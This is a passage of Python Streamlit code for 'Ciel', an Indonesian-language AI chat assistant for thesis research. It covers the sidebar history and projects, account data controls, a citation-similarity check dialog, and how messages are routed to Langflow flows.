    st.session_state.open_cek = {"topic": topic, "map_index": map_index}


@st.dialog("Cek kutipan & kemiripan")
def cek_dialog(topic, map_index):

    st.markdown(
        '<p class="ciel-riset-lead">Ciel mencocokkan setiap sitasi di drafmu dengan '
        "<b>peta sumber</b> ini dan menandai kalimat yang terlalu mirip dengan sumbernya, "
        "jadi kamu tahu bagian mana yang perlu diparafrasekan atau dikutip dengan benar.</p>",
        unsafe_allow_html=True,
    )

    if not is_pro():

        st.markdown(
            '<p class="ciel-riset-lock">Fitur ini khusus <b>Ciel Pro</b>.</p>',
            unsafe_allow_html=True,
        )

        if st.button("Lihat paket Pro", type="primary", icon=":material/sell:"):
            show_pricing()
            st.rerun()

        return

    pasted = st.text_area(
        "Draf",
        height=220,
        max_chars=MAX_DRAFT_CHARS,
        placeholder="Tempel Bab 1, 2, atau 3 di sini.",
    )

    uploaded = st.file_uploader("Atau unggah file .docx / .txt (dipakai jika ada)", type=DRAFT_FILE_TYPES)

    st.caption(f"Selesai dalam hitungan detik. Kuota {CEK_KUTIPAN_PER_DAY} cek per hari.")

    if st.button("Cek draf", type="primary", icon=":material/fact_check:"):

        draft = pasted

        if uploaded is not None:
            try:
                draft = draft_from_file(uploaded.name, uploaded.getvalue())
            except ValueError:
                st.error(f"{uploaded.name} tidak bisa dibaca. Simpan ulang sebagai .docx, atau tempel teksnya.")
                return

        draft = clean_draft(draft)

        if word_count(draft) < MIN_DRAFT_WORDS:
            st.error(f"Drafnya terlalu pendek. Tempel minimal {MIN_DRAFT_WORDS} kata.")
            return

        st.session_state.pending = make_cek_pending(topic, draft, map_index)
        st.rerun()


def retry_last():
    messages = current_messages()

    if (
        len(messages) >= 2
        and messages[-1]["role"] == "assistant"
        and messages[-1].get("error")
        and messages[-2]["role"] == "user"
    ):
        user = messages[-2]

        st.session_state.pending = {
            "text": user["content"],
            "files": user.get("files", []),
            "images": user.get("images", []),
            "payload": user.get("payload", user["content"]),
            "riset": user.get("riset"),
            "kerangka": user.get("kerangka"),
            "cek": user.get("cek"),
        }

        del messages[-2:]
        persist_chat(active_chat())


# ------------------------------------------------------------
# RENDER
# ------------------------------------------------------------

def render_files(names):
    if not names:
        return

    chips = "".join(
        f'<span class="ciel-filechip">{html.escape(name)}</span>'
        for name in names
    )

    st.markdown(
        f'<div class="ciel-files" aria-label="Lampiran">{chips}</div>',
        unsafe_allow_html=True,
    )


def render_user(message):
    st.markdown(message["content"])
    render_files(message.get("files"))

    images = message.get("images") or []

    if images:
        st.image(
            [image["data"] for image in images],
            caption=[image["name"] for image in images],
            width=180,
        )


def render_history_row(chat):
    """Satu baris riwayat: judul membuka chat, menu berisi arsip dan hapus."""

    chat_id = chat["id"]
    is_active = chat_id == st.session_state.active_chat

    with st.container(key=f"chatrow_{chat_id}", horizontal=True, gap="small"):

        # Whole title; the row wraps instead of cutting it (see the CSS).
        label = f"{chat_label(chat)}  ·  {relative_time(chat.get('updated', time.time()), time.time())}"

        if has_riset_map(chat):
            label += "  ·  Riset"

        st.button(
            label,
            key=f"chatactive_{chat_id}" if is_active else f"chat_{chat_id}",
            on_click=select_chat,
            args=(chat_id,),
            width="stretch",
        )

        with st.popover("", icon=":material/more_horiz:", help="Opsi chat"):

            if chat.get("archived"):
                st.button(
                    "Pulihkan",
                    key=f"unarchive_{chat_id}",
                    icon=":material/unarchive:",
                    on_click=set_archived,
                    args=(chat_id, False),
                )
            else:
                st.button(
                    "Arsipkan",
                    key=f"archive_{chat_id}",
                    icon=":material/archive:",
                    on_click=set_archived,
                    args=(chat_id, True),
                )

            # Hapus tidak bisa dibatalkan, jadi minta konfirmasi seperti panel "Data saya".
            st.checkbox("Yakin hapus chat ini", key=f"delok_{chat_id}")

            st.button(
                "Hapus chat",
                key=f"delchat_{chat_id}",
                icon=":material/delete:",
                disabled=not st.session_state.get(f"delok_{chat_id}"),
                on_click=delete_chat,
                args=(chat_id,),
            )


def format_elapsed(seconds):
    minutes, rest = divmod(int(seconds), 60)
    return f"{minutes} m {rest} d" if minutes else f"{rest} d"


def render_chat_header(chat, summary):
    counts = count_line(summary)
    st.markdown(
        '<div class="ciel-chathead">'
        f"<h1>{html.escape(chat['title'])}</h1>"
        + (f"<p>{html.escape(counts)}</p>" if counts else "")
        + "</div>",
        unsafe_allow_html=True,
    )


def render_rail(summary, memories, riset_message):
    """Panel kanan: sumber, yang belum ketemu, ingatan, dan catatan riset."""

    def section(title, count, body):
        badge = f' <span class="ciel-count">{count}</span>' if count else ""
        return f"<section><h2>{title}{badge}</h2>{body}</section>"

    parts = []

    if summary.groups:
        items = []
        for group in summary.groups:
            if len(summary.groups) > 1:
                items.append(f'<p class="ciel-rail-q">{html.escape(group.question)}</p>')
            items.extend(
                f'<a class="ciel-ri" href="{html.escape(source.url, quote=True)}" target="_blank" rel="noopener noreferrer" '
                f'aria-label="{html.escape(source_label(source), quote=True)}">'
                f"<b>{source.number}</b><span><strong>{html.escape(source.title)}</strong>"
                f"<em>{html.escape(source.domain)}</em></span></a>"
                for source in group.sources
                if source.url.startswith(("https://", "http://"))
            )
        parts.append(section("Sumber di chat ini", summary.unique_count, "".join(items)))

    if summary.guesses:
        items = "".join(
            f'<div class="ciel-gap"><i aria-hidden="true"></i><span>{html.escape(guess)}</span></div>'
            for guess in summary.guesses
        )
        parts.append(section("Belum ketemu", len(summary.guesses), items))

    if memories:
        chips = "".join(
            f'<span class="ciel-mc">{html.escape(short(str(item.get("text", "")), 40))}</span>'
            for item in memories[:6]
        )
        parts.append(section("Yang Ciel ingat", len(memories), f"<div>{chips}</div>"))

    if riset_message is not None:
        rows = [("Mode", "Riset Skripsi"), ("Sumber di peta", str(summary.map_entries))]
        if riset_message.get("elapsed"):
            rows.append(("Waktu riset", format_elapsed(riset_message["elapsed"])))
        facts = "".join(f"<div><dt>{label}</dt><dd>{html.escape(value)}</dd></div>" for label, value in rows)
        parts.append(section("Riset ini", None, f'<dl class="ciel-kv">{facts}</dl>'))

    st.markdown(f'<div class="ciel-rail">{"".join(parts)}</div>', unsafe_allow_html=True)


def render_error(content, index, show_retry):

    title, plain, technical = split_error(content)

    with st.container(key=f"errcard_{index}"):

        st.markdown(
            '<div class="ciel-errhead" role="alert">'
            '<span class="ciel-badge">Gagal</span>'
            f"<strong>{html.escape(title)}</strong>"
            "</div>",
            unsafe_allow_html=True,
        )

        if plain:
            st.markdown("\n\n".join(plain))

        if technical:
            with st.expander("Detail teknis"):
                st.markdown("\n\n".join(technical))

        if show_retry:
            st.button(
                "Coba lagi",
                key=f"retry_{index}",
                icon=":material/refresh:",
                on_click=retry_last,
            )


# ============================================================
# SIDEBAR
# ============================================================

with st.sidebar:

    st.markdown(
        '<div class="ciel-sidehead">'
        f'<span class="ciel-wordmark">{CIEL_MARK_SVG}Ciel</span>'
        "</div>",
        unsafe_allow_html=True,
    )

    # --------------------------------------------------------
    # NEW CHAT
    # --------------------------------------------------------

    st.button(
        "Chat baru",
        key="newchat",
        type="primary",
        icon=":material/add:",
        on_click=new_chat,
    )

    if RISET_ENABLED:

        # Terlihat juga untuk akun gratis; dialognya menjelaskan paket Pro.
        # Dialog dibuka dari area utama (di bawah HEADER), bukan dari sidebar.
        st.button(
            "Riset Skripsi" if is_pro() else "Riset Skripsi · Pro",
            key="riset_open",
            icon=":material/school:",
            # Tanpa help=: tooltip membungkus tombol sehingga aturan
            # ".stButton > button" (warna mode gelap) tidak lagi berlaku.
            on_click=open_riset_dialog,
        )

    # --------------------------------------------------------
    # PROJECTS
    # --------------------------------------------------------

    st.markdown(
        '<div class="ciel-eyebrow">Proyek</div>',
        unsafe_allow_html=True,
    )

    active_project_id = st.session_state.active_project

    with st.container(key="projects"):

        st.button(
            "Semua chat",
            key=(
                "projactive_all"
                if active_project_id is None
                else "proj_all"
            ),
            icon=":material/forum:",
            on_click=select_project,
            args=(None,),
        )

        for project_id, project in st.session_state.projects.items():

            is_active = project_id == active_project_id

            st.button(
                short(project["name"], 30),
                key=(
                    f"projactive_{project_id}"
                    if is_active
                    else f"proj_{project_id}"
                ),
                icon=":material/folder:",
                on_click=select_project,
                args=(project_id,),
            )

    with st.popover("Proyek baru", icon=":material/create_new_folder:"):

        st.text_input(
            "Nama proyek",
            key="newproj_name",
            max_chars=40,
            placeholder="Contoh: Riset kompetitor",
        )

        st.button(
            "Buat proyek",
            key="createproj",
            type="primary",
            on_click=create_project,
        )

    if active_project_id in st.session_state.projects:

        project = st.session_state.projects[active_project_id]
        upload_key = f"pfup_{active_project_id}_{st.session_state.upload_nonce}"

        with st.expander(
            f"File proyek ({len(project['files'])})",
            expanded=not project["files"],
        ):

            st.file_uploader(
                "Tambahkan file ke proyek ini",
                type=ALLOWED_FILE_TYPES,
                accept_multiple_files=True,
                key=upload_key,
                on_change=add_project_files,
                args=(active_project_id, upload_key),
                help=(
                    "File teks akan dipakai sebagai konteks di semua "
                    "chat dalam proyek ini."
                ),
            )

            if not project["files"]:
                st.caption("Belum ada file di proyek ini.")

            for item in project["files"]:

                st.markdown(
                    '<div class="ciel-projfile">'
                    f"<span>{html.escape(short(item['name'], 28))}</span>"
                    f"<em>{format_size(item['size'])}</em>"
                    "</div>",
                    unsafe_allow_html=True,
                )

                st.button(
                    f"Hapus {short(item['name'], 20)}",
                    key=f"rmfile_{active_project_id}_{item['name']}",
                    icon=":material/close:",
                    on_click=remove_project_file,
                    args=(active_project_id, item["name"]),
                )

            # Proyek tersimpan ikut terhapus dari database, jadi minta konfirmasi.
            st.checkbox("Yakin hapus proyek ini", key=f"delprojok_{active_project_id}")

            st.button(
                "Hapus proyek",
                key=f"delproj_{active_project_id}",
                icon=":material/delete:",
                disabled=not st.session_state.get(f"delprojok_{active_project_id}"),
                on_click=delete_project,
                args=(active_project_id,),
            )

    # --------------------------------------------------------
    # HISTORY
    # --------------------------------------------------------

    st.markdown(
        '<div class="ciel-eyebrow">'
        f'{"Chat di proyek ini" if active_project_id in st.session_state.projects else "Riwayat"}'
        "</div>",
        unsafe_allow_html=True,
    )

    notice = st.session_state.pop("store_notice", None)

    if notice:
        st.toast(notice, icon=":material/error:")

    project_chats = sorted(
        (
            chat
            for chat in st.session_state.chats.values()
            if active_project_id is None
            or chat["project_id"] == active_project_id
        ),
        key=lambda chat: chat["updated"],
        reverse=True,
    )
    history = [chat for chat in project_chats if not chat.get("archived")][:HISTORY_LIMIT]
    archived = [chat for chat in project_chats if chat.get("archived")]

    if not history:
        st.caption("Semua chat sudah diarsipkan." if archived else "Belum ada percakapan.")

    if CHAT_STORE and not logged_in():
        st.caption("Masuk supaya riwayat chat tetap ada setelah halaman dimuat ulang.")

    with st.container(key="history"):

        for chat in history:
            render_history_row(chat)

        if archived:
            with st.expander(f"Diarsipkan ({len(archived)})"):
                for chat in archived:
                    render_history_row(chat)

    # --------------------------------------------------------
    # ACCOUNT (bawah sidebar, seperti menu akun claude.ai)
    # --------------------------------------------------------

    if logged_in():

        account_name = st.user.get("name") or st.user.get("email") or "Akun"

        with st.container(key="sideaccount"):

            with st.popover(
                short(account_name, 22),
                icon=":material/account_circle:",
                width="stretch",
            ):

                # HTML, bukan st.caption: markdown mengubah email jadi link mailto.
                st.markdown(
                    '<div class="ciel-account-email">'
                    f'{html.escape(st.user.get("email") or account_name)}'
                    "</div>",
                    unsafe_allow_html=True,
                )

                with st.container(key="accountnav"):
                    page_nav_buttons()

                st.markdown(
                    '<div class="ciel-note">'
                    "<p>Long-term memory aktif dan hanya milik akunmu. Ciel bisa "
                    "mengingat konteks penting lintas percakapan.</p>"
                    f"<p>ID memory: <code>{memory_owner_id()}</code></p>"
                    f"{pro_status_html()}"
                    "</div>",
                    unsafe_allow_html=True,
                )

                with st.expander("Data saya"):

                    if not MEMORY_ADMIN_FLOW_ID:

                        st.caption("Pengelolaan data belum aktif di deployment ini.")

                    else:

                        notice = st.session_state.pop("data_notice", None)

                        if notice:
                            (st.success if notice[0] == "success" else st.error)(notice[1])

                        st.button(
                            "Tampilkan memoriku",
                            key="load_memories",
                            icon=":material/visibility:",
                            on_click=load_my_memories,
                        )

                        listing = st.session_state.get("my_memories")

                        if listing is not None and not listing.get("ok"):
                            st.caption("Memory belum bisa dimuat. Silakan coba lagi.")

                        elif listing is not None and not listing.get("memories"):
                            st.caption("Belum ada memory yang tersimpan.")

                        elif listing is not None:

                            st.caption(f"{listing.get('total', 0)} memory tersimpan")

                            for item in listing["memories"]:

                                st.markdown(
                                    '<div class="ciel-projfile">'
                                    f"<span>{html.escape(short(item['text'], 90))}</span>"
                                    "</div>",
                                    unsafe_allow_html=True,
                                )

                                st.button(
                                    "Hapus",
                                    key=f"delmem_{item['id']}",
                                    icon=":material/close:",
                                    on_click=delete_my_memory,
                                    args=(item["id"],),
                                )

                        st.checkbox(
                            "Saya yakin ingin menghapus semua memoriku",
                            key="confirm_delete_memories",
                        )

                        st.button(
                            "Hapus semua memoriku",
                            key="delete_all_memories",
                            icon=":material/delete:",
                            disabled=not st.session_state.get("confirm_delete_memories"),
                            on_click=delete_all_my_memories,
                        )

                        st.button(
                            "Tampilkan datasetku",
                            key="load_datasets",
                            icon=":material/table_chart:",
                            on_click=load_my_datasets,
                        )

                        datasets = st.session_state.get("my_datasets")

                        if datasets is not None and not datasets.get("ok"):
                            st.caption("Dataset belum bisa dimuat. Silakan coba lagi.")

                        elif datasets is not None and not datasets.get("datasets"):
                            st.caption("Belum ada dataset yang tersimpan.")

                        elif datasets is not None:

                            st.caption(f"{datasets.get('total', 0)} dataset tersimpan")
                            exported = st.session_state.get("dataset_export")

                            for item in datasets["datasets"]:

                                st.markdown(
                                    '<div class="ciel-projfile">'
                                    f"<span>{html.escape(short(item['name'], 28))}</span>"
                                    f"<em>{item['rows']} baris</em>"
                                    "</div>",
                                    unsafe_allow_html=True,
                                )

                                if exported and exported[0] == item["name"]:
                                    st.download_button(
                                        "Unduh CSV",
                                        data=exported[1].encode("utf-8"),
                                        file_name=f"{item['name']}.csv",
                                        mime="text/csv",
                                        key=f"dl_{item['name']}",
                                        icon=":material/download:",
                                    )
                                else:
                                    st.button(
                                        "Siapkan unduhan",
                                        key=f"exp_{item['name']}",
                                        icon=":material/download:",
                                        on_click=export_my_dataset,
                                        args=(item["name"],),
                                    )

                                st.button(
                                    "Hapus",
                                    key=f"deldata_{item['name']}",
                                    icon=":material/close:",
                                    on_click=delete_my_dataset,
                                    args=(item["name"],),
                                )

                        st.checkbox(
                            "Saya yakin ingin menghapus semua datasetku",
                            key="confirm_delete_datasets",
                        )

                        st.button(
                            "Hapus semua datasetku",
                            key="delete_all_datasets",
                            icon=":material/delete:",
                            disabled=not st.session_state.get("confirm_delete_datasets"),
                            on_click=delete_all_my_datasets,
                        )

                        st.checkbox(
                            "Saya yakin ingin menghapus riwayat chat-ku di server",
                            key="confirm_delete_history",
                        )

                        st.button(
                            "Hapus riwayat chat-ku di server",
                            key="delete_history",
                            icon=":material/history:",
                            disabled=not st.session_state.get("confirm_delete_history"),
                            on_click=delete_my_chat_history,
                        )

                with st.container(key="accountexit"):

                    st.button(
                        "Keluar",
                        key="logout",
                        type="tertiary",
                        icon=":material/logout:",
                        on_click=st.logout,
                    )


# ============================================================
# HEADER
# ============================================================

topbar_project = st.session_state.projects.get(
    st.session_state.active_project
)

# Satu baris flex (bukan st.columns) supaya brand dan nav tidak ditumpuk
# Streamlit di layar sempit.
with st.container(
    key="topbar",
    horizontal=True,
    vertical_alignment="center",
):

    # Crumb, as in the artifact: where you are, not the brand (the wordmark
    # lives in the sidebar head).
    crumb = (
        f"Proyek · <b>{html.escape(short(topbar_project['name'], 40))}</b>"
        if topbar_project
        else "Semua chat"
    )

    st.markdown(f'<p class="ciel-crumb">{crumb}</p>', unsafe_allow_html=True)

    with st.container(
        key="topnav",
        horizontal=True,
        horizontal_alignment="right",
        vertical_alignment="center",
        width="content",
    ):

        st.html(THEME_TOGGLE_HTML, width="content")

        if not logged_in():

            st.button(
                "Masuk",
                key=(
                    "navactive_login"
                    if current_view() == "login"
                    else "login"
                ),
                on_click=show_login,
            )


# Dialog Riset Skripsi (tombol di sidebar). Rerun di dalam dialog tidak
# menjalankan ulang baris ini, jadi dialog tetap terbuka sampai ditutup.
if st.session_state.pop("open_riset", False) and RISET_ENABLED:
    riset_dialog()

# Dialog Kerangka Bab 1-3 (tombol di bawah peta sumber).
kerangka_target = st.session_state.pop("open_kerangka", None)

if kerangka_target and WRITER_ENABLED:
    kerangka_dialog(kerangka_target["topic"], kerangka_target["map_index"])

# Dialog Cek kutipan & kemiripan (tombol di bawah peta sumber).
cek_target = st.session_state.pop("open_cek", None)

if cek_target and CHECK_ENABLED:
    cek_dialog(cek_target["topic"], cek_target["map_index"])


# ============================================================
# PRICING PAGE
# ============================================================
# Dirender sebelum chat input supaya composer tidak muncul di halaman harga.

if current_view() == "pricing":
    render_pricing(
        contact_url=CONTACT_URL,
        on_start_chat=show_chat,
        rate_limits=(RATE_LIMIT_PER_HOUR, RATE_LIMIT_PER_HOUR_LOGIN),
        memory_enabled=AUTH_ENABLED,
        pro_action=render_pro_action if PAYMENTS_ENABLED else None,
        history_saved=CHAT_STORE is not None,
    )
    st.stop()

if current_view() == "privacy":
    render_privacy(
        retention_days=CHAT_RETENTION_DAYS,
        memory_enabled=AUTH_ENABLED,
        data_controls=bool(MEMORY_ADMIN_FLOW_ID),
        contact_url=safe_contact_url(CONTACT_URL),
        operator=OPERATOR_NAME,
        history_saved=CHAT_STORE is not None,
        payments=PAYMENTS_ENABLED,
    )
    st.stop()

if current_view() == "login":
    render_login(
        auth_enabled=AUTH_ENABLED,
        on_google=st.login,
        on_back=show_chat,
        rate_limits=(RATE_LIMIT_PER_HOUR, RATE_LIMIT_PER_HOUR_LOGIN),
        signed_in_as=(
            st.user.get("name") or st.user.get("email") or "pengguna"
            if logged_in()
            else None
        ),
        history_saved=CHAT_STORE is not None,
        on_privacy=show_privacy,
    )
    st.stop()


# ============================================================
# BERANDA / CHAT INPUT
# ============================================================
# Tanpa pesan: Beranda, dengan composer di tengah halaman. Setelah pesan
# pertama terkirim, Beranda dikosongkan di run yang sama sehingga chat
# langsung tampil; dengan pesan, composer berada di bawah seperti biasa.

messages = current_messages()

if not messages and not st.session_state.pending:

    beranda_slot = st.empty()

    with beranda_slot.container(key="beranda"):
        take_composer_value(render_beranda())

    if st.session_state.pending:
        beranda_slot.empty()

else:
    take_composer_value(composer("Tanyakan sesuatu kepada Ciel..."))

pending_request = st.session_state.pending
st.session_state.pending = None


# ============================================================
# CHAT HISTORY
# ============================================================

last_index = len(messages) - 1
convo = st.container()

if messages:

    summary = summarize(messages)
    rail_memories = session_memories()
    riset_messages = [m for m in messages if m.get("kind") == RISET_KIND and not m.get("error")]

    # Tiga kolom (sidebar, percakapan, panel kanan) hanya jika panelnya berisi.
    if summary.groups or summary.guesses or rail_memories or riset_messages:
        convo, rail = st.columns([7, 3], gap="large")
        with rail, st.container(key="rail"):
            render_rail(summary, rail_memories, riset_messages[-1] if riset_messages else None)

    with convo:
        render_chat_header(active_chat(), summary)

for index, message in enumerate(messages):

    with convo, st.chat_message(
        message["role"],
        avatar=AVATARS.get(message["role"]),
    ):

        if message["role"] == "user":

            render_user(message)

        elif message.get("error"):

            render_error(
                message["content"],
                index,
                show_retry=(index == last_index),
            )

        else:

            # Riwayat lama (Supabase) dibersihkan lagi saat ditampilkan.
            content = strip_markdown_images(message["content"])[0]
            before, sources, after = answer_parts(content)
            st.markdown(before)

            if sources:
                st.markdown(source_buttons_html(sources), unsafe_allow_html=True)

            if after:
                st.markdown(after)

            if message.get("kind") == RISET_KIND:

                topic = message.get("topic") or "Riset Skripsi"

                with st.container(horizontal=True, gap="small"):

                    # DOCX baru dibuat saat tombol diklik (data berupa fungsi).
                    st.download_button(
                        "Unduh DOCX",
                        data=lambda content=content, topic=topic: report_docx(content, topic),
                        file_name=report_filename(topic),
                        mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                        key=f"rsdocx_{st.session_state.active_chat}_{index}",
                        icon=":material/download:",
                        on_click="ignore",
                    )

                    if WRITER_ENABLED:
                        st.button(
                            "Susun kerangka Bab 1–3",
                            key=f"rsframe_{st.session_state.active_chat}_{index}",
                            icon=":material/account_tree:",
                            on_click=open_kerangka_dialog,
                            args=(topic, index),
                        )

                    if CHECK_ENABLED:
                        st.button(
                            "Cek kutipan & kemiripan",
                            key=f"rscheck_{st.session_state.active_chat}_{index}",
                            icon=":material/fact_check:",
                            on_click=open_cek_dialog,
                            args=(topic, index),
                        )

            elif message.get("kind") == KERANGKA_KIND:

                topic = message.get("topic") or "Kerangka Bab 1–3"

                st.download_button(
                    "Unduh DOCX",
                    data=lambda content=content, topic=topic: report_docx(
                        content, topic, label="Kerangka Bab 1–3", footnote=KERANGKA_FOOTNOTE,
                    ),
                    file_name=report_filename(topic, prefix="Kerangka Bab 1-3"),
                    mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                    key=f"kfdocx_{st.session_state.active_chat}_{index}",
                    icon=":material/download:",
                    on_click="ignore",
                )


# ============================================================
# PROCESS NEW MESSAGE
# ============================================================

if pending_request:

    # --------------------------------------------------------
    # CHAT (BUAT BARU JIKA BELUM ADA)
    # --------------------------------------------------------

    started = time.time()
    chat = active_chat()

    if chat is None:

        chat_id = uuid.uuid4().hex[:8]

        chat = {
            "id": chat_id,
            "title": short(pending_request["text"], 48),
            "messages": [],
            "project_id": st.session_state.active_project,
            "updated": time.time(),
        }

        st.session_state.chats[chat_id] = chat
        st.session_state.active_chat = chat_id

    # --------------------------------------------------------
    # USER MESSAGE
    # --------------------------------------------------------

    user_message = {
        "role": "user",
        "content": pending_request["text"],
        "files": pending_request["files"],
        "images": pending_request["images"],
        "payload": pending_request["payload"],
    }

    riset = pending_request.get("riset")
    kerangka = pending_request.get("kerangka")
    cek = pending_request.get("cek")

    if riset:
        user_message["riset"] = riset

    if kerangka:
        user_message["kerangka"] = kerangka

    if cek:
        user_message["cek"] = cek

    chat["messages"].append(user_message)
    chat["updated"] = time.time()

    with convo, st.chat_message("user", avatar=AVATARS["user"]):

        render_user(user_message)

    # --------------------------------------------------------
    # ASSISTANT MESSAGE
    # --------------------------------------------------------

    with convo, st.chat_message("assistant", avatar=AVATARS["assistant"]):

        working_slot = st.empty()

        working_slot.markdown(
            RISET_THINKING_HTML if riset else KERANGKA_THINKING_HTML if kerangka else THINKING_HTML,
            unsafe_allow_html=True,
        )

        # Satu session Langflow per chat: "Chat baru" benar-benar mulai
        # dari konteks kosong dan riwayat Agent tidak tercampur antar pengguna.
        session_id = f"{user_key()}-{chat['id']}"

        # Lampiran CSV/TSV tetap tersedia untuk pertanyaan lanjutan di chat ini.
        stored_tables = chat.setdefault("tables", {})
        stored_tables.update(pending_request.get("tables", {}))

        while len(stored_tables) > MAX_CHAT_TABLES:
            stored_tables.pop(next(iter(stored_tables)))

        tables = chat_tables(chat)

        # Riset Skripsi: status Pro dicek di server sebelum kuota dipakai, jadi
        # permintaan buatan sendiri tanpa Pro tidak pernah sampai ke flow riset.
        answer = (
            riset_refusal() or check_rate_limit("riset")
            if riset
            else kerangka_refusal() or missing_map(chat, kerangka, "Susun kerangka Bab 1–3") or check_rate_limit("kerangka")
            if kerangka
            else cek_refusal() or missing_map(chat, cek, "Cek kutipan & kemiripan") or check_rate_limit("cek")
            if cek
            else check_rate_limit()
        )
        excerpts = {}

        if answer is None and cek:

            # Tanpa Langflow dan tanpa model: pemeriksaan deterministik (draft_check.py).
            source = map_message(chat, cek["map_index"])
            answer = check_report(cek["draft"], source["content"], source.get("excerpts") or {}, cek["topic"])

        elif answer is None and kerangka:

            source_map = kerangka_source(chat, kerangka)
            answer = ask_langflow(
                kerangka_payload(source_map, kerangka["topic"], kerangka["approach"], kerangka.get("object", "")),
                session_id=f"{session_id}-penulis",
                flow_id=WRITER_FLOW_ID,
                timeout=WRITER_TIMEOUT,
            )

            # Nomor [n] di luar Daftar Pustaka peta sumber dibuang di sini,
            # lalu Daftar Pustaka itu ditempel supaya kerangka berdiri sendiri.
            if not is_error_answer(answer):
                answer = finish_kerangka(answer, source_map)

        elif answer is None and riset:

            answer = ask_langflow(
                riset_payload(**riset),
                tweaks={RESEARCH_SEARCH_ID: {"start_published_date": riset_start_date(riset)}},
                session_id=session_id,
                flow_id=RESEARCH_FLOW_ID,
                timeout=RESEARCH_TIMEOUT,
            )

            # Cuplikan sumber dari flow (untuk Cek kutipan) tidak ikut ditampilkan.
            if not is_error_answer(answer):
                answer, excerpts = split_excerpts(answer)

        elif answer is None and pending_request["images"]:

            image_paths, upload_error = upload_images(
                pending_request["images"]
            )

            if upload_error:
                answer = upload_error
            else:
                answer = ask_langflow(
                    pending_request["payload"],
                    tweaks=build_tweaks(image_paths, tables),
                    session_id=session_id,
                )

        elif answer is None:

            answer = ask_langflow(
                pending_request["payload"],
                tweaks=build_tweaks(tables=tables),
                session_id=session_id,
            )

        working_slot.empty()

    failed = is_error_answer(answer)

    # Lampiran asli hanya perlu disimpan untuk tombol Retry.
    if not failed:
        # Catat kapan isi file proyek terakhir dikirim; pesan berikutnya
        # cukup menyebut nama filenya selama salinan ini masih di riwayat.
        if pending_request.get("project_context"):
            chat["project_context"] = pending_request["project_context"]

        user_message.pop("payload", None)

        # Draf tidak disimpan di riwayat; laporan cek sudah memuat bagian yang perlu direvisi.
        if cek:
            user_message["cek"] = {key: value for key, value in cek.items() if key != "draft"}
        user_message["images"] = [
            make_thumbnail(image) for image in user_message["images"]
        ]

    reply = {
        "role": "assistant",
        "content": answer,
        "error": failed,
        "elapsed": int(time.time() - started),
    }

    # Penanda hasil Riset Skripsi: tombol Unduh DOCX dan konteks pertanyaan lanjutan.
    if riset and not failed:
        reply["kind"] = RISET_KIND
        reply["topic"] = riset["topic"]

        if excerpts:
            reply["excerpts"] = excerpts

    if kerangka and not failed:
        reply["kind"] = KERANGKA_KIND
        reply["topic"] = kerangka["topic"]

    if cek and not failed:
        reply["kind"] = CEK_KIND
        reply["topic"] = cek["topic"]

    chat["messages"].append(reply)
    chat["updated"] = time.time()
    persist_chat(chat)

    # Render ulang agar jawaban, riwayat sidebar, dan tombol retry tampil
    # dari state dengan struktur yang sama seperti pesan lama.
    st.rerun()
